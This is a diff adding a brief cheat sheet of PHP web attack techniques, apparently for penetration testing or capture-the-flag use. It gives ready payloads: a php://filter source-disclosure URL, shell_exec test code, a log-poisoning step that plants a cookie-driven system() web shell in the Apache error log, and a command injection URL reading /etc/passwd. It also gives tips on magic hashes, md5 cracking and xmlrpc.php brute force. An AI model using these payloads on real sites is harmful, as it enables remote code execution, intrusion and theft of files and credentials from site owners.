@@ -1,0 +1,27 @@
+#########################
+# PHP Website attacks	#
+#########################
+<?php echo "hello" ?>		- Used to test for potential code execution
+http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index	- By replacing the url with the site and m= with the variable you are trying to explore, you can for the PHP to force encode file and return the source code
+<?php echo shell_exec("pwd”) ?> 	- Create's a shell and executes the command pwd
+
+#########################
+# Server-Side attacks	#
+#########################
+
+Step 1: Brute force the location of the Apache HTTP Error Log
+Step 2: Poison /var/log/httpd/error.log with <?php system(base64_decode($_COOKIE['asjdkfljhasfd'])); ?>
+
+Directory Traversal 	- attempt to go back or forth as if the url was a linux system
+
+http://admin/something_private.php?dir=`cat%20/etc/passwd` - Command Injection
+
+###########################
+# Things to look out for  #
+###########################
+
+Type confusion	- is the result being comapred with == or ===
+md5		- md5 is outdatted and proven to be not secure, you may be able to brute force a hash using website or HashCat
+0e134125123	- Magic hashes can be combined with comparators to potentially break into systems even if the hash is incorrect due to potential evaluation to 0
+xmlrpc.php	- If using wordpress, you may be able to brute force your way inthrough here
+
